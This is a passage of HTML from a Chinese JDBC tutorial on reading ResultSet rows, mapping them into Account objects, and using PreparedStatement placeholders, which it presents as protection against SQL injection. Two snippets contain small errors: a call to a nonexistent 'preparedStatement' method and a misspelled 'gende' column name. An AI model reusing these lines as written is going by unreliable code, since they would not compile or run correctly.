12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>boolean next ():(1) 将光标从当前位置移动向下一行(2) 判断当前行是否为有效行</p><blockquote><p>返回值：</p><ul><li>true：有效行，当前行有数据</li><li>false：无效行，当前行没有数据</li></ul></blockquote><p>xxx getXxx (参数)：获取数据</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>xxx：参数类型，如 int getint (参数); String getString (参数)</p><p>参数：</p><ul><li>int：列的编号，从 1 开始</li><li>String：列的名称</li></ul></blockquote></blockquote><ul><li>使用步骤<ol><li>游标向下移动一行，并判断该行是否有数据：next ()</li><li>获取数据：getXxx (参数)</li></ol></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//循环判断游标是否为最后一行末尾</span><span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//获取数据</span>    rs<span class="token punctuation">.</span><span class="token function">getXxx</span><span class="token punctuation">(</span>参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>jdbc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DriverManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCDemo5_ResultSet</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * ResultSet     * @throws Exception     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testResultSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Statement</span> statement <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM ACCOUNT"</span><span class="token punctuation">;</span>        <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//处理结果</span>        <span class="token comment">//光标向下移动一行，并且判断当前行是否有数据</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//获取数据</span>            <span class="token keyword">int</span> anInt <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> string <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> anInt1 <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> money <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>id <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        statement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>pojo：用来存放实体类，简单的 java 对象的包</p></blockquote><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>需求：将数据库中的数据封装为 account 对象，并存储到集合中</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testResultSet2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>    <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Statement</span> statement <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM ACCOUNT"</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//创建一个集合</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Account</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Account</span> account <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Account</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取数据</span>        <span class="token keyword">int</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">double</span> money <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置数据</span>        account<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        account<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        account<span class="token punctuation">.</span><span class="token function">setMoney</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//向列表内添加数据</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    statement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="35-preparedstatement"><a class="markdownIt-Anchor" href="#35-preparedstatement">#</a> 3.5 PreparedStatement</h2><ul><li>PreparedStatement 作用：<ol><li>预编译 SQL 语句并执行：预防 SQL 注入问题</li></ol></li><li>SQL 注入：<ul><li>SQL 注入是通过操作输入来修改事先定义好的 SQL 语句，用以达到执行代码对服务器进行攻击的方法</li></ul></li></ul><ol><li>获取 PreparedStatement 对象</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//SQL语句中的参数值，使用？占位符替代</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where username = ? and password = ?"</span><span class="token punctuation">;</span><span class="token comment">//通过Connection对象获取，并传入对应的SQL语句</span><span class="token class-name">PreparedStatement</span> pstmt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">preparedStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>设置参数值</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PreparedStatement</span>对象：<span class="token function">setXxx</span><span class="token punctuation">(</span>参数<span class="token number">1</span>，参数<span class="token number">2</span><span class="token punctuation">)</span>：给？赋值<span class="token class-name">Xxx</span>：数据类型<span class="token punctuation">,</span>如<span class="token function">setInt</span><span class="token punctuation">(</span>参数<span class="token number">1</span>，参数<span class="token number">2</span><span class="token punctuation">)</span>参数：    参数<span class="token number">1</span>：？的位置编号，从<span class="token number">1</span>开始    参数<span class="token number">2</span>：？的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>执行 SQL</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 不需要再传递SQL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>jdbc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCDemo5_PreparedStatement</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * PreparedStatement     * @throws Exception     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testPreparedStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql:///db3?useSSL=false&amp;useServerPrepStmts=true"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置sql，用？代替参数的位置</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM EMP WHERE ID = ?"</span><span class="token punctuation">;</span>        <span class="token comment">//获取PreparedStatement，传递SQL</span>        <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置参数</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行</span>        <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> gender <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"gende"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> salary <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token string">"salary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Date</span> join_date <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token string">"join_date"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> dept_id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"dept_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>gender<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>join_date<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dept_id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>要使用预编译功能，在获取连接的 url 里要使用键值对 <code>useServerPrepStmts=true</code>  手动开启，默认是关闭的</li><li>配置 MySQL 执行日志（my.ini，重启 mysql 服务后生效）</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 